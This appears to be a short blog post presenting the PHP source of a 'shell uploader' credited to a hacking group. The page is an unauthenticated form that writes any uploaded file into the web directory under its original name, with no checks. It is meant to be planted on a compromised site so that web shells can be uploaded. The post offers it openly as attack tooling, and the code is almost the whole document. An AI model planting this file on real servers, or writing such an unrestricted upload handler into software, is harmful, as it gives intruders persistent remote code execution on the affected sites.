---
id: 24
title: Shell Uploader source code
author: admin
layout: post
categories:
  - PHP
---


### Anonymous Armenian Shell Uploader source code

#### By Anonymous Armenia


{% highlight php linenos %}

<!DOCTYPE html>
<html>
<head>
	<title>SHELL UPLOADER BY ANONYMOUS ARMENIA</title>
</head>
<body>
<h1>SHELL UPLOADER BY ANONYMOUS ARMENIA</h1>
<form method="post" enctype="multipart/form-data">
<br>
</br>
<input name="file[]" type="file" multiple/>
<br>
<input type="submit" value="upload" name="upload" />
</form>
<?php
if (isset($_POST["upload"])) {
	for ($i=0; $i < count($_FILES['file']['name']); $i++) {
		if (copy($_FILES["file"]["tmp_name"][$i], $_FILES["file"]["name"][$i])) {
			echo $_FILES["file"]["name"][$i]."<br>";
		}
	}
}
?>
</body>
</html>
{% endhighlight %}
